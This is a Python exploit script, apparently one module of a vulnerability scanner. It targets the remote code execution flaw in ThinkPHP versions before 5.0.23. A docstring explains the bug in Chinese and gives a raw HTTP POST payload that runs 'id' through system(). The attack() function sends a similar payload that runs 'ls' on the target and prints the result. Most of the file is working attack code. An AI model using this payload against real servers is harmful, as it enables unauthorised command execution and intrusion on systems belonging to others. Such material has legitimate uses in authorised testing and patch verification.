# -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup

'''
moon.py -u thinkphp http://xxxx.xxxx.xxxx.xxxx:xx
ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。

POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
'''


def attack(url):
    print('[+]开始检测 thinkphp_before5.0.23_rce ！')
    URL1 = url + r'/index.php?s=captcha'
    try:
        data = {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'server[REQUEST_METHOD]': 'ls'}
        re = requests.post(URL1, data=data, verify=False, timeout=10)
    except Exception:
        print('[-]访问漏洞页面失败，未发现该漏洞！')
        print('\n')
    else:
        if re.status_code == 200 and 'System Error' in re.text:
            print('[+]命令成功执行，获取到的目录如下:')
            try:
                print(re.text[:80])
                print('[+]漏洞检测结束,存在 thinkphp_before5.0.23_rce ！')
                print('\n')
            except Exception:
                print('[-]获取数据出错！请自行访问页面判断.')
                print('\n')
        else:
            print('[-]访问漏洞页面失败，未发现该漏洞', URL1, re.status_code)
            print('\n')


if __name__ == "__main__":
    attack()
